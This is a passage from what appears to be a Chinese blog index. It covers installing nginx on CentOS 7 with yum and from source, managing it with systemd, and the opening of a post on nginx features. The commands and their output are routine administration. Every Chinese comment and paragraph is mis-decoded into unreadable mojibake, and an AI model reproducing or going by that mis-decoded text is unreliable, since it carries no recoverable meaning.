0:00 nginx: worker process nginx 2236 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process nginx 2237 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process nginx 2238 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process nginx 2239 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process root 2242 0.0 0.0 112812 980 pts/1 R+ 17:24 0:00 grep --color=auto nginx [root@centos7 ~]# nginx -s quit #å…³é—­nginxï¼ˆè¿›ç¨‹ç»“æŸå½“å‰ä»»åŠ¡åè‡ªåŠ¨å…³é—­ï¼‰ [root@centos7 ~]# ps aux | grep nginx root 2246 0.0 0.0 112812 980 pts/1 R+ 17:26 0:00 grep --color=auto nginx [root@centos7 ~]# nginx -g \u0026#39;daemon off;\u0026#39; #å‰å°å¯åŠ¨nginxï¼Œåœ¨dockerä¸­å¯åŠ¨æ—¶æœ‰ç”¨ã€‚ ^C[root@centos7 ~]# [root@centos7 ~]# nginx -t #nginxè¯­æ³•æ£€æŸ¥æˆåŠŸ nginx: the configuration file /etc/nginx/nginx.conf syntax is ok nginx: configuration file /etc/nginx/nginx.conf test is successful nginx è‡ªå¯åŠ¨serviceæ–‡ä»¶ [root@centos7 ~]# rpm -ql nginx | grep service /usr/lib/systemd/system/nginx-debug.service /usr/lib/systemd/system/nginx.service [root@centos7 ~]# cat /usr/lib/systemd/system/nginx.service [Unit] Description=nginx - high performance web server Documentation=http://nginx.org/en/docs/ After=network-online.target remote-fs.target nss-lookup.target Wants=network-online.target [Service] Type=forking PIDFile=/var/run/nginx.pid ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf ExecReload=/bin/sh -c \u0026#34;/bin/kill -s HUP $(/bin/cat /var/run/nginx.pid)\u0026#34; ExecStop=/bin/sh -c \u0026#34;/bin/kill -s TERM $(/bin/cat /var/run/nginx.pid)\u0026#34; [Install] WantedBy=multi-user.target nginx é…ç½®æ–‡ä»¶ [root@centos7 ~]# rpm -qc nginx /etc/logrotate.d/nginx /etc/nginx/conf.d/default.conf /etc/nginx/fastcgi_params /etc/nginx/mime.types /etc/nginx/nginx.conf /etc/nginx/scgi_params /etc/nginx/uwsgi_params #nginxå®‰è£…ç›®å½•ç»“æœ [root@centos7 ~]# tree /etc/nginx/ /etc/nginx/ â”œâ”€â”€ conf.d â”‚Â â””â”€â”€ default.conf â”œâ”€â”€ fastcgi_params â”œâ”€â”€ mime.types â”œâ”€â”€ modules -\u0026gt; ../../usr/lib64/nginx/modules â”œâ”€â”€ nginx.conf â”œâ”€â”€ scgi_params â””â”€â”€ uwsgi_params 2 directories, 6 files #nginxé»˜è®¤é…ç½® [root@centos7 ~]# egrep -v \u0026#34;^ *#|^$\u0026#34; /etc/nginx/nginx.conf user nginx; error_log /var/log/nginx/error.log notice; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; sendfile on; keepalive_timeout 65; include /etc/nginx/conf.d/*.conf; } nginx å¯åŠ¨ç®¡ç† [root@centos7 ~]# systemctl enable --now nginx #å¯åŠ¨nginxå¹¶è®¾ç½®å¼€æœºè‡ªå¯åŠ¨ --åˆ©ç”¨serviceæ–‡ä»¶ç®¡ç† Created symlink from /etc/systemd/system/multi-user.target.wants/nginx.service to /usr/lib/systemd/system/nginx.service. [root@centos7 ~]# systemctl status nginx #nginxæˆåŠŸè¿è¡Œ â— nginx.service - nginx - high performance web server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: active (running) since Wed 2022-07-20 17:42:56 CST; 7s ago Docs: http://nginx.org/en/docs/ Process: 2327 ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf (code=exited, status=0/SUCCESS) Main PID: 2328 (nginx) CGroup: /system.slice/nginx.service â”œâ”€2328 nginx: master process /usr/sbin/nginx -c /etc/nginx/nginx.conf â””â”€2329 nginx: worker process Jul 20 17:42:56 centos7 systemd[1]: Starting nginx - high performance web server... Jul 20 17:42:56 centos7 systemd[1]: Failed to parse PID from file /var/run/nginx.pid: Invalid argument Jul 20 17:42:56 centos7 systemd[1]: Started nginx - high performance web server. [root@centos7 ~]# nginx -s quit #ä½¿ç”¨nginxå‘½ä»¤å…³é—­ [root@centos7 ~]# ps aux | grep nginx #å…³é—­æˆåŠŸ root 2338 0.0 0.0 112812 980 pts/1 R+ 17:43 0:00 grep --color=auto nginx [root@centos7 ~]# systemctl status nginx #nginxçŠ¶æ€ä¸º failed â— nginx.service - nginx - high performance web server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: failed (Result: exit-code) since Wed 2022-07-20 17:43:12 CST; 24s ago Docs: http://nginx.org/en/docs/ Process: 2333 ExecStop=/bin/sh -c /bin/kill -s TERM $(/bin/cat /var/run/nginx.pid) (code=exited, status=1/FAILURE) Process: 2327 ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf (code=exited, status=0/SUCCESS) Main PID: 2328 (code=exited, status=0/SUCCESS) Jul 20 17:43:12 centos7 sh[2333]: -s, --signal \u0026lt;sig\u0026gt; send specified signal Jul 20 17:43:12 centos7 sh[2333]: -q, --queue \u0026lt;sig\u0026gt; use sigqueue(2) rather than kill(2) Jul 20 17:43:12 centos7 sh[2333]: -p, --pid print pids without signaling them Jul 20 17:43:12 centos7 sh[2333]: -l, --list [=\u0026lt;signal\u0026gt;] list signal names, or convert one to a name Jul 20 17:43:12 centos7 sh[2333]: -L, --table list signal names and numbers Jul 20 17:43:12 centos7 sh[2333]: -h, --help display this help and exit Jul 20 17:43:12 centos7 sh[2333]: -V, --version output version information and exit Jul 20 17:43:12 centos7 sh[2333]: For more details see kill(1). Jul 20 17:43:12 centos7 systemd[1]: Unit nginx.service entered failed state. Jul 20 17:43:12 centos7 systemd[1]: nginx.service failed. [root@centos7 ~]# systemctl stop nginx #ä½¿ç”¨systemctl å…³é—­nginx [root@centos7 ~]# systemctl status nginx â— nginx.service - nginx - high performance web server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: inactive (dead) since Wed 2022-07-20 17:47:47 CST; 1min 28s ago Docs: http://nginx.org/en/docs/ Process: 2378 ExecStop=/bin/sh -c /bin/kill -s TERM $(/bin/cat /var/run/nginx.pid) (code=exited, status=0/SUCCESS) Process: 2361 ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf (code=exited, status=0/SUCCESS) Main PID: 2362 (code=exited, status=0/SUCCESS) Jul 20 17:43:51 centos7 systemd[1]: Starting nginx - high performance web server... Jul 20 17:43:51 centos7 systemd[1]: Can\u0026#39;t open PID file /var/run/nginx.pid (yet?) after start: No such file or directory Jul 20 17:43:51 centos7 systemd[1]: Started nginx - high performance web server. Jul 20 17:47:47 centos7 systemd[1]: Stopping nginx - high performance web server... Jul 20 17:47:47 centos7 systemd[1]: Stopped nginx - high performance web server. [root@centos7 ~]# nginx #å¯åŠ¨nginx [root@centos7 ~]# ps -ef|grep nginx #æŸ¥çœ‹nginxè¿›ç¨‹å·²å¯åŠ¨ root 2403 1 0 17:49 ? 00:00:00 nginx: master process nginx nginx 2404 2403 0 17:49 ? 00:00:00 nginx: worker process root 2407 2204 0 17:49 pts/1 00:00:00 grep --color=auto nginx [root@centos7 ~]# systemctl stop nginx #ä½¿ç”¨systemctlåœæ­¢nginx [root@centos7 ~]# ps -ef|grep nginx #å‘ç°å¹¶æœªæˆåŠŸåœæ­¢nginxè¿›ç¨‹ root 2403 1 0 17:49 ? 00:00:00 nginx: master process nginx nginx 2404 2403 0 17:49 ? 00:00:00 nginx: worker process root 2416 2204 0 17:49 pts/1 00:00:00 grep --color=auto nginx [root@centos7 ~]# systemctl status nginx #systemctlæ˜¾ç¤ºnginxè¿›ç¨‹å¹¶æœªå¯åŠ¨ â— nginx.service - nginx - high performance web server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: inactive (dead) since Wed 2022-07-20 17:47:47 CST; 2min 15s ago Docs: http://nginx.org/en/docs/ Process: 2378 ExecStop=/bin/sh -c /bin/kill -s TERM $(/bin/cat /var/run/nginx.pid) (code=exited, status=0/SUCCESS) Process: 2361 ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf (code=exited, status=0/SUCCESS) Main PID: 2362 (code=exited, status=0/SUCCESS) Jul 20 17:43:51 centos7 systemd[1]: Starting nginx - high performance web server... Jul 20 17:43:51 centos7 systemd[1]: Can\u0026#39;t open PID file /var/run/nginx.pid (yet?) after start: No such file or directory Jul 20 17:43:51 centos7 systemd[1]: Started nginx - high performance web server. Jul 20 17:47:47 centos7 systemd[1]: Stopping nginx - high performance web server... Jul 20 17:47:47 centos7 systemd[1]: Stopped nginx - high performance web server. [root@centos7 ~]# curl localhost #è®¿é—®nginxæˆåŠŸï¼Œnginxæ˜¯æ­£å¸¸è¿è¡ŒçŠ¶æ€ \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome to nginx!\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; html { color-scheme: light dark; } body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome to nginx!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;If you see this page, the nginx web server is successfully installed and working. Further configuration is required.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;For online documentation and support please refer to \u0026lt;a href=\u0026#34;http://nginx.org/\u0026#34;\u0026gt;nginx.org\u0026lt;/a\u0026gt;.\u0026lt;br/\u0026gt; Commercial support is available at \u0026lt;a href=\u0026#34;http://nginx.com/\u0026#34;\u0026gt;nginx.com\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;em\u0026gt;Thank you for using nginx.\u0026lt;/em\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; #åŸå› åˆ†æ systemctl ä½¿ç”¨serviceæ–‡ä»¶ç®¡ç†nginxè¿›ç¨‹ã€‚å½“æ‰§è¡Œsystemctl start nginxæ—¶ï¼Œä¼šå°†nginxè¿›ç¨‹çš„pidè®°å½•å¹¶å­˜æ”¾åœ¨æŒ‡å®šè·¯å¾„ä¸‹çš„pidæ–‡ä»¶ä¸­ï¼ˆå…·ä½“ç”±serviceæ–‡ä»¶å®šä¹‰ï¼‰ã€‚å½“æ‰§è¡Œsystemctl stop nginxæ—¶ï¼Œé€šè¿‡pidæ–‡ä»¶å‘å¯¹åº”çš„nginxè¿›ç¨‹å‘é€ä¿¡å·ä½¿nginxè¿›ç¨‹ä¸­æ­¢è¿è¡Œã€‚å¦‚æœå¹¶æœªé€šè¿‡æ‰§è¡Œsystemctl start nginxå¯åŠ¨nginxï¼Œé‚£ä¹ˆsystemctl stop nginxå‘½ä»¤æ˜¯æ— æ³•å…³é—­nginxè¿›ç¨‹çš„ã€‚å› æ­¤ä¸Šæ–‡æ‰§è¡Œnginxå‘½ä»¤å¯åŠ¨äº†nginxè¿›ç¨‹ï¼Œæ˜¯æ— æ³•é€šè¿‡systemctl stop å…³é—­nginxè¿›ç¨‹çš„ã€‚ ç¼–è¯‘å®‰è£… nginx ç¼–è¯‘å™¨ä»‹ç»\næºç å®‰è£…éœ€è¦æå‰å‡†å¤‡æ ‡å‡†çš„ç¼–è¯‘å™¨ï¼ŒGCCçš„å…¨ç§°æ˜¯ï¼ˆGNU Compiler collectionï¼‰ï¼Œå…¶æœ‰GNUå¼€å‘ï¼Œå¹¶ä»¥GPLå³LGPLè®¸å¯ï¼Œæ˜¯è‡ªç”±çš„ç±»UNIXå³è‹¹æœç”µè„‘Mac OS Xæ“ä½œç³»ç»Ÿçš„æ ‡å‡†ç¼–è¯‘å™¨ï¼Œå› ä¸ºGCCåŸæœ¬åªèƒ½å¤„ç†Cè¯­è¨€ï¼Œæ‰€ä»¥åŸåä¸ºGNU Cè¯­è¨€ç¼–è¯‘å™¨ï¼Œåæ¥å¾—åˆ°å¿«é€Ÿå‘å±•ï¼Œå¯ä»¥å¤„ç†C++,Fortranï¼Œpascalï¼Œobjective\u0002Cï¼Œjavaä»¥åŠAdaç­‰å…¶ä»–è¯­è¨€ï¼Œæ­¤å¤–è¿˜éœ€è¦Automakeå·¥å…·ï¼Œä»¥å®Œæˆè‡ªåŠ¨åˆ›å»ºMakefileçš„å·¥ä½œï¼ŒNginxçš„ä¸€äº›æ¨¡å—éœ€è¦ä¾èµ–ç¬¬ä¸‰æ–¹åº“ï¼Œæ¯”å¦‚: pcreï¼ˆæ”¯æŒrewriteï¼‰ï¼Œzlibï¼ˆæ”¯æŒgzipæ¨¡å—ï¼‰å’Œopensslï¼ˆæ”¯æŒsslæ¨¡å—ï¼‰ç­‰ã€‚ ä½¿ç”¨å®˜æ–¹æºç¼–è¯‘å®‰è£… å®˜æ–¹æºç åŒ…åœ°å€ï¼šhttps://nginx.org/en/download.html\nèŒƒä¾‹ï¼šç¼–è¯‘å®‰è£…nginx\n[root@centos7 ~]#yum -y install gcc pcre-devel openssl-devel zlib-devel #å®‰è£…å·¥å…·åŒ…å’Œä¾èµ– [root@centos7 ~]#useradd -s /sbin/nologin nginx #æ·»åŠ nginxè´¦å·å¹¶é…ç½®ä¸å¯ç™»å½• [root@centos7 ~]#cd /usr/local/src/ [root@centos7 src]#wget http://nginx.org/download/nginx-1.18.0.tar.gz #ä¸‹è½½æºç åŒ… [root@centos7 src]#tar xf nginx-1.18.0.tar.gz [root@centos7 src]#cd nginx-1.18.0/ #é…ç½®ç¼–è¯‘å‚æ•°å¹¶æ£€æŸ¥ç¯å¢ƒä¾èµ–ï¼ˆå¦‚ä¸Šæ–‡æåˆ°çš„gccï¼Œpcreç­‰ä¾èµ–æœªå®‰è£…åˆ™ä¼šæŠ¥é”™ï¼‰ [root@centos7 nginx-1.18.0]#./configure --prefix=/apps/nginx \\ --user=nginx \\ --group=nginx \\ --with-http_ssl_module \\ --with-http_v2_module \\ --with-http_realip_module \\ --with-http_stub_status_module \\ --with-http_gzip_static_module \\ --with-pcre \\ --with-stream \\ --with-stream_ssl_module \\ --with-stream_realip_module [root@centos7 nginx-1.18.0]#make \u0026amp;\u0026amp; make install [root@centos7 nginx-1.18.0]#chown -R nginx.nginx /apps/nginx nginxå®‰è£…å®Œæˆåï¼Œæœ‰å››ä¸ªä¸»è¦ç›®å½•\n[root@centos7 ~]# tree /apps/nginx/ /apps/nginx/ â”œâ”€â”€ conf â”‚Â â”œâ”€â”€ fastcgi.conf â”‚Â â”œâ”€â”€ fastcgi.conf.default â”‚Â â”œâ”€â”€ fastcgi_params â”‚Â â”œâ”€â”€ fastcgi_params.default â”‚Â â”œâ”€â”€ koi-utf â”‚Â â”œâ”€â”€ koi-win â”‚Â â”œâ”€â”€ mime.types â”‚Â â”œâ”€â”€ mime.types.default â”‚Â â”œâ”€â”€ nginx.conf â”‚Â â”œâ”€â”€ nginx.conf.default â”‚Â â”œâ”€â”€ scgi_params â”‚Â â”œâ”€â”€ scgi_params.default â”‚Â â”œâ”€â”€ uwsgi_params â”‚Â â”œâ”€â”€ uwsgi_params.default â”‚Â â””â”€â”€ win-utf â”œâ”€â”€ html â”‚Â â”œâ”€â”€ 50x.html â”‚Â â””â”€â”€ index.html â”œâ”€â”€ logs â””â”€â”€ sbin â””â”€â”€ nginx confï¼šä¿å­˜nginxæ‰€æœ‰çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­nginx.confæ˜¯nginxæœåŠ¡å™¨çš„æœ€æ ¸å¿ƒæœ€ä¸»è¦çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä»–çš„.confåˆ™æ˜¯ç”¨æ¥é…ç½®nginxç›¸å…³çš„åŠŸèƒ½çš„ï¼Œä¾‹å¦‚fastcgiåŠŸèƒ½ä½¿ç”¨çš„æ˜¯fastcgi.confå’Œfastcgi_paramsä¸¤ä¸ªæ–‡ä»¶ï¼Œé…ç½®æ–‡ä»¶ä¸€èˆ¬éƒ½æœ‰ä¸ªæ¨¡æ¿é…ç½®æ–‡ä»¶ï¼Œæ˜¯æ–‡ä»¶å.defaultç»“å°¾ï¼Œä½¿ç”¨çš„æ—¶å€™å°†å…¶å¤åˆ¶ä¸ºå¹¶å°†åç¼€defaultå»æ‰å³å¯ã€‚ htmlç›®å½•ä¸­ä¿å­˜äº†nginxæœåŠ¡å™¨çš„webæ–‡ä»¶ï¼Œä½†æ˜¯å¯ä»¥æ›´æ”¹ä¸ºå…¶ä»–ç›®å½•ä¿å­˜webæ–‡ä»¶,å¦å¤–è¿˜æœ‰ä¸€ä¸ª50xçš„webæ–‡ä»¶æ˜¯é»˜è®¤çš„é”™è¯¯é¡µé¢æç¤ºé¡µé¢ã€‚ logsï¼šç”¨æ¥ä¿å­˜nginxæœåŠ¡å™¨çš„è®¿é—®æ—¥å¿—é”™è¯¯æ—¥å¿—ç­‰æ—¥å¿—ï¼Œlogsç›®å½•å¯ä»¥æ”¾åœ¨å…¶ä»–è·¯å¾„ï¼Œæ¯”å¦‚/var/logs/nginxé‡Œé¢ã€‚ sbinï¼šä¿å­˜nginxäºŒè¿›åˆ¶å¯åŠ¨è„šæœ¬ï¼Œå¯ä»¥æ¥å—ä¸åŒçš„å‚æ•°ä»¥å®ç°ä¸åŒçš„åŠŸèƒ½ã€‚ éªŒè¯ç‰ˆæœ¬åŠç¼–è¯‘å‚æ•° [root@centos7 ~]# ls /apps/nginx/sbin/ #nginxäºŒè¿›åˆ¶ç¨‹åºè·¯å¾„ nginx [root@centos7 ~]# ln -s /apps/nginx/sbin/nginx /usr/sbin/ #åˆ›å»ºè½¯é“¾æ¥åˆ°PATHè·¯å¾„ ln: failed to create symbolic link â€˜/usr/sbin/nginxâ€™: File exists #æ³¨æ„ä¹‹å‰yumå®‰è£…nginxå·²ç”Ÿæˆè¯¥æ–‡ä»¶ï¼Œå› æ­¤è½¯è¿æ¥åˆ›å»ºå¤±è´¥ [root@centos7 ~]# nginx -v #æŸ¥çœ‹åˆ°çš„æ˜¯yumå®‰è£…çš„ç‰ˆæœ¬ nginx version: nginx/1.22.0 #ä½¿ç”¨ç»å¯¹è·¯å¾„æŸ¥çœ‹æºç å®‰è£…çš„nginxç‰ˆæœ¬ï¼ˆå¦‚æœè¦ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œå¯è‡ªè¡Œé…ç½®ç¯å¢ƒå˜é‡PATHï¼‰ [root@centos7 ~]# /apps/nginx/sbin/nginx -v nginx version: nginx/1.18.0 [root@centos7 ~]# /apps/nginx/sbin/nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module [root@centos7 ~]# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin #é‡æ–°åˆ›å»ºè½¯è¿æ¥åˆ°PATHå˜é‡æŒ‡å‘çš„è·¯å¾„ä¸‹ï¼ˆè¶Šé å·¦ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼‰ [root@centos7 ~]# ln -s /apps/nginx/sbin/nginx /usr/local/sbin/ [root@centos7 ~]# exec bash #é‡æ–°åŠ è½½bashç¨‹åºï¼ˆç›®çš„æ˜¯åˆ é™¤ä¸Šæ–‡æ‰§è¡Œnginxå‘½ä»¤åç”Ÿæˆçš„ç¼“å­˜ï¼‰ [root@centos7 ~]# nginx -v #è§‚å¯Ÿåˆ°å·²ç»æ˜¯æºç å®‰è£…çš„nginxç‰ˆæœ¬ nginx version: nginx/1.18.0 éªŒè¯å®‰è£…ç»“æœ [root@centos7 ~]# nginx #å¯åŠ¨nginx [root@centos7 ~]# ps -ef|grep nginx #è¿›ç¨‹å·²å¯åŠ¨ root 5692 1 0 19:08 ? 00:00:00 nginx: master process nginx nginx 5693 5692 0 19:08 ? 00:00:00 nginx: worker process root 5695 2204 0 19:08 pts/1 00:00:00 grep --color=auto nginx [root@centos7 ~]# curl localhost #è®¿é—®æµ‹è¯• \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome to nginx!\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome to nginx!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;If you see this page, the nginx web server is successfully installed and working. Further configuration is required.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;For online documentation and support please refer to \u0026lt;a href=\u0026#34;http://nginx.org/\u0026#34;\u0026gt;nginx.org\u0026lt;/a\u0026gt;.\u0026lt;br/\u0026gt; Commercial support is available at \u0026lt;a href=\u0026#34;http://nginx.com/\u0026#34;\u0026gt;nginx.com\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;em\u0026gt;Thank you for using nginx.\u0026lt;/em\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; #å…³é—­nginx [root@centos7 ~]# nginx -s stop [root@centos7 ~]# ps -ef|grep nginx root 5701 2204 0 19:10 pts/1 00:00:00 grep --color=auto nginx åˆ›å»ºnginxçš„serviceæ–‡ä»¶ä»¥å®ç°å¼€æœºè‡ªå¯åŠ¨ #æ³¨æ„ExecStartå’ŒExecReloadçš„è·¯å¾„è¦å’Œå®é™…å®‰è£…è·¯å¾„åŒ¹é… [root@centos7 ~]# cat \u0026gt; /usr/lib/systemd/system/nginx.service \u0026lt;\u0026lt;EOF [Unit] Description=nginx - high performance web server Documentation=http://nginx.org/en/docs/ After=network-online.target remote-fs.target nss-lookup.target Wants=network-online.target [Service] Type=forking PIDFile=/apps/nginx/run/nginx.pid ExecStart=/apps/nginx/sbin/nginx -c /apps/nginx/conf/nginx.conf ExecReload=/bin/kill -s HUP \\$MAINPID ExecStop=/bin/kill -s TERM \\$MAINPID [Install] WantedBy=multi-user.target EOF #åˆ›å»ºç¼ºå°‘çš„ç›®å½• [root@centos7 ~]# mkdir /apps/nginx/run #ä¿®æ”¹pidæ–‡ä»¶æŒ‡å‘çš„è·¯å¾„ [root@centos7 ~]# cat /apps/nginx/conf/nginx.conf | grep pid pid run/nginx.pid; #é‡æ–°åŠ è½½serviceæ–‡ä»¶é…ç½® [root@centos7 ~]# systemctl daemon-reload #æˆåŠŸä½¿ç”¨serviceæ–‡ä»¶ç®¡ç†nginxè¿›ç¨‹ [root@centos7 ~]# systemctl start nginx [root@centos7 ~]# systemctl status nginx â— nginx.service - nginx - high performance web server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: active (running) since Wed 2022-07-20 19:22:30 CST; 1min 10s ago Docs: http://nginx.org/en/docs/ Main PID: 5769 (nginx) CGroup: /system.slice/nginx.service â”œâ”€5769 nginx: master process /usr/sbin/nginx -c /etc/nginx/nginx.conf â””â”€5770 nginx: worker process Jul 20 19:22:30 centos7 systemd[1]: Starting nginx - high performance web server... Jul 20 19:22:30 centos7 systemd[1]: Can\u0026#39;t open PID file /var/run/nginx.pid (yet?) after start: No such file or directory #æ­¤æŠ¥é”™å¯èƒ½æ˜¯nginxè‡ªèº«çš„bugé€ æˆçš„ï¼ŒæœåŠ¡æœ¬èº«æ­£å¸¸ã€‚ Jul 20 19:22:30 centos7 systemd[1]: Started nginx - high performance web server. nginxæœåŠ¡æ­£å¸¸ï¼Œä½†æŸ¥çœ‹çŠ¶æ€æŠ¥é”™ï¼šCan\u0026rsquo;t open PID file /var/run/nginx.pid (yet?) after start: No such file or directory\nå‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/XY0918ZWQ/article/details/114165979\n","permalink":"https://senmer.github.io/zh/posts/tech/nginx/nginx%E5%AE%89%E8%A3%85/","summary":"\u003cp\u003eç¼–è¯‘å®‰è£…nginxå’Œyumå®‰è£…Nginx\u003c/p\u003e","title":"Nginxå®‰è£…"},{"content":"NginxåŸºç¡€æ¶æ„å’ŒåŠŸèƒ½ç®€ä»‹\nNginxæ¶æ„ Nginx æ¦‚è¿° Nginx ä»‹ç» **Nginxï¼š**engine X ï¼Œ2002å¹´å¼€å‘ï¼Œåˆ†ä¸ºç¤¾åŒºç‰ˆå’Œå•†ä¸šç‰ˆ(nginx plus )\n2019å¹´3æœˆ11æ—¥ F5 Networks 6.7äº¿ç¾å…ƒçš„ä»·æ ¼æ”¶è´­\nNginxæ˜¯å…è´¹çš„ã€å¼€æºçš„ã€é«˜æ€§èƒ½çš„HTTPå’Œåå‘ä»£ç†æœåŠ¡å™¨ã€é‚®ä»¶ä»£ç†æœåŠ¡å™¨ã€ä»¥åŠTCP/UDPä»£ç†æœåŠ¡å™¨è§£å†³äº†C10Ké—®é¢˜ï¼ˆ10K Connectionsï¼‰ï¼Œå‚è€ƒé“¾æ¥: http://www.ideawu.net/blog/archives/740.html\n**Nginxå®˜ç½‘ï¼š**http://nginx.org ï¼ˆç¤¾åŒºç‰ˆï¼‰ï¼Œhttps://www.nginx.com/ï¼ˆå•†ä¸šç‰ˆï¼‰\nnginxçš„å…¶å®ƒçš„äºŒæ¬¡å‘è¡Œç‰ˆï¼š\n**Tengineï¼š**ç”±æ·˜å®ç½‘å‘èµ·çš„WebæœåŠ¡å™¨é¡¹ç›®ã€‚å®ƒåœ¨Nginxçš„åŸºç¡€ä¸Šï¼Œé’ˆå¯¹å¤§è®¿é—®é‡ç½‘ç«™çš„éœ€æ±‚ï¼Œæ·»åŠ äº†å¾ˆå¤šé«˜çº§åŠŸèƒ½å’Œç‰¹æ€§ã€‚Tengineçš„æ€§èƒ½å’Œç¨³å®šæ€§å·²ç»åœ¨å¤§å‹çš„ç½‘ç«™å¦‚æ·˜å®ç½‘ï¼Œå¤©çŒ«å•†åŸç­‰å¾—åˆ°äº†å¾ˆå¥½çš„æ£€éªŒã€‚å®ƒçš„æœ€ç»ˆç›®æ ‡æ˜¯æ‰“é€ ä¸€ä¸ªé«˜æ•ˆã€ç¨³å®šã€å®‰å…¨ã€æ˜“ç”¨çš„Webå¹³å°ã€‚ä»2011å¹´12æœˆå¼€å§‹ï¼ŒTengineæˆä¸ºä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œå®˜ç½‘: http://tengine.taobao.org/\n**OpenRestyï¼š**åŸºäº Nginx ä¸ Lua è¯­è¨€çš„é«˜æ€§èƒ½ Web å¹³å°ï¼Œ ç« äº¦æ˜¥å›¢é˜Ÿå¼€å‘ï¼Œå®˜ç½‘ï¼šhttp://openresty.org/cn/\nNginx åŠŸèƒ½ä»‹ç» é™æ€çš„webèµ„æºæœåŠ¡å™¨ï¼Œå¦‚ htmlï¼Œå›¾ç‰‡ï¼Œjsï¼Œcssï¼Œtxt ç­‰é™æ€èµ„æº åŸºäºhttp/httpsåè®®çš„åå‘ä»£ç†ï¼ˆä¸ƒå±‚ï¼‰ ç»“åˆFastCGI/uWSGI/SCGIç­‰åè®®åå‘ä»£ç†åŠ¨æ€èµ„æºè¯·æ±‚ åŸºäºtcp/udpåè®®åå‘ä»£ç†ï¼ˆå››å±‚ï¼‰ imap4/pop3åè®®çš„åå‘ä»£ç†ï¼ˆé‚®ä»¶æœåŠ¡å™¨ï¼‰ Nginx åŸºç¡€ç‰¹æ€§ æ¨¡å—åŒ–è®¾è®¡ï¼Œè¾ƒå¥½çš„æ‰©å±•æ€§ é«˜å¯é æ€§ æ”¯æŒçƒ­éƒ¨ç½²ï¼šä¸åœæœºæ›´æ–°é…ç½®æ–‡ä»¶ï¼Œå‡çº§ç‰ˆæœ¬ï¼Œæ›´æ¢æ—¥å¿—æ–‡ä»¶ ä½å†…å­˜æ¶ˆè€—ï¼š10000ä¸ªkeep-aliveè¿æ¥æ¨¡å¼ä¸‹çš„éæ´»åŠ¨è¿æ¥ï¼Œä»…éœ€2.5Må†…å­˜ æ”¯æŒå¤šç§IOæ¨¡å‹å’Œé›¶æ‹·è´æŠ€æœ¯ï¼ševent-driven, aio, mmapï¼Œsendfile Web æœåŠ¡ç›¸å…³çš„åŠŸèƒ½ è™šæ‹Ÿä¸»æœºï¼ˆserverï¼‰ æ”¯æŒ keep-alive å’Œç®¡é“è¿æ¥(åˆ©ç”¨ä¸€ä¸ªè¿æ¥åšå¤šæ¬¡è¯·æ±‚) è®¿é—®æ—¥å¿—ï¼ˆæ”¯æŒåŸºäºæ—¥å¿—ç¼“å†²æé«˜å…¶æ€§èƒ½ï¼‰ url rewirte è·¯å¾„åˆ«å åŸºäºIPåŠç”¨æˆ·çš„è®¿é—®æ§åˆ¶ æ”¯æŒé€Ÿç‡é™åˆ¶åŠå¹¶å‘æ•°é™åˆ¶ 